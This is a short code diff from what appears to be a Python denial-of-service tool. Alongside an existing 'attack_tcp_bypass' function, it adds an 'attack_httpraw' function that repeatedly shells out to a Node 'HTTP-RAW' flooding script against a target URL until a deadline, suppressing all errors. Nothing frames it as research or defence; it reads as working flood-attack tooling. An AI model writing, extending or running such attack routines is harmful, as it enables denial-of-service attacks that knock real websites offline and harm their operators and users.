@@ -132,6 +132,15 @@ def attack_tcp_bypass(ip, port, end_time, size):
 
 
 
+def attack_httpraw(url, end_time):
+    max_packets = 1950
+
+    while time.time() < end_time:
+        try:
+            os.system(f'node HTTP-RAW {url} {end_time}')
+            
+        except:
+            pass
 
 
 
